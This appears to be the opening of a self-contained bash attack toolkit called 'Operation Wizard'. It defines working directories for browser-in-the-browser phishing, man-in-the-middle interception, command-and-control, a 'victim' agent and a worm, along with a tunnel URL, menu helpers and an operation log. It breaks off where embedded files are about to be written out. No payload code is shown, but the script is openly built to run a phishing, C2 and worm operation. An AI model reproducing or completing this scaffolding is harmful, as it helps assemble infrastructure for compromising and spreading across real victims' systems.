#!/bin/bash
# ╔══════════════════════════════════════════════════════════╗
# ║              OPERATION WIZARD — ALL-IN-ONE               ║
# ║    Self-contained: everything lives inside this file     ║
# ╚══════════════════════════════════════════════════════════╝

# ── Base directory — everything goes here ────────────────────
OP="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)/op"

# ── Derived paths ─────────────────────────────────────────────
BITB_DIR="$OP/bitb"
MITM_DIR="$OP/mitm"
C2_DIR="$OP/c2"
AGENT_SRC="$OP/victim"
WORM_SRC="$OP/victim"
LOG="$OP/operation.log"
TUNNEL_URL=""
TUNNEL_PID=""

# ── Colours ──────────────────────────────────────────────────
R='\033[0;31m'; G='\033[0;32m'; Y='\033[1;33m'
C='\033[0;36m'; W='\033[1;37m'; N='\033[0m'
B='\033[0;34m'

# ── Helpers ──────────────────────────────────────────────────
banner() {
    clear
    echo -e "${C}"
    echo "  ╔═══════════════════════════════════════════════════╗"
    echo "  ║              OPERATION WIZARD                     ║"
    echo "  ╚═══════════════════════════════════════════════════╝"
    echo -e "${N}"
}

step() {
    echo -e "\n${Y}┌─ STEP $1: $2${N}"
}

ok()   { echo -e "  ${G}✓${N} $1"; }
warn() { echo -e "  ${Y}!${N} $1"; }
err()  { echo -e "  ${R}✗${N} $1"; }
info() { echo -e "  ${C}→${N} $1"; }

ask() {
    echo -e "\n  ${W}$1${N}"
    echo -n "  > "
    read -r REPLY
}

choose() {
    echo -e "\n  ${W}$1${N}"
    local i=1
    for opt in "${@:2}"; do
        echo -e "  ${C}[$i]${N} $opt"
        ((i++))
    done
    echo -n "  > "
    read -r CHOICE
}

wait_key() {
    echo -e "\n  ${B}Press Enter to continue...${N}"
    read -r
}

log() { echo "[$(date '+%H:%M:%S')] $1" >> "$LOG"; }

# ══════════════════════════════════════════════════════════════
# INIT — write every embedded file to $OP/ on first run
# This makes /tmp/start fully self-contained — no other files
# ══════════════════════════════════════════════════════════════
